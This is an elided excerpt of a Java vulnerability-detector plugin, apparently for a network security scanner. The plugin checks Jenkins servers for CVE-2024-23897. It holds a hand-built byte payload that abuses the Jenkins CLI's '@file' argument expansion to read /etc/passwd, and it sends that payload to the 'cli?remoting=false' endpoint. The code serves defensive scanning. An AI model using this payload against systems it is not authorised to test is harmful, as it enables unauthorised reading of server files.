...
@PluginInfo(
    ...
    version = "1.0",
    description =
        "Jenkins uses the args4j library to parse command arguments and options on the Jenkins controller when "
                + "processing CLI commands. This command parser has a feature that replaces an @ character "
                + "followed by a file path in an argument with the file's contents (expandAtFiles). This feature "
                + "is enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable it."
                + "This allows attackers to read arbitrary files on the Jenkins controller file system using the "
...
public final class Cve202423897Detector implements VulnDetector {
  ...
  @VisibleForTesting
  static final String VULNERABLE_REQUEST_PATH = "cli?remoting=false";
  static final byte[] PAYLOAD = {
          0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x04,
          0x68, 0x65, 0x6c, 0x70,
          0x00, 0x00, 0x00, 0x0e,
          0x00, 0x00, 0x0c,
          // @/etc/passwd
          0x40, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64,
          0x00, 0x00, 0x00, 0x05, 0x02, 0x00, 0x03,
          // GBK
          0x47, 0x42, 0x4b,
          0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05,
          // zh_CN
          0x7a, 0x68, 0x5f, 0x43, 0x4e,
  ...
  private boolean isServiceVulnerable(NetworkService networkService) {
    ...
    Future<Boolean> firstRequest = executorService.submit(() -> {
      try {
        HttpResponse response = httpClient.send(post(targetUrl)
        ...
        logger.atWarning().log("failed to send the first request to target %s.", networkService);
        return false;
      }
    });
            ...
            Vulnerability.newBuilder()
                ...
                .setDescription(
                    "Jenkins uses the args4j library to parse command arguments and options on the Jenkins controller "
                        ...
                        + "the Jenkins controller process.")
